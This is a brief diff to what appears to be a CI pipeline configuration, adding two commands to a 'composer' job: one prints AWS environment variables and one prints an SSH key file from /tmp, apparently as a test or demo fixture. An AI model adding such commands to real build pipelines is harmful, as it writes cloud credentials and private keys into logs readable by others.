@@ -31,6 +31,8 @@ blocks:
       jobs:
         - name: composer
           commands:
+            - env | grep "AWS"
             - echo "deploying"
+            - cat /tmp/example-sshkey
 
 
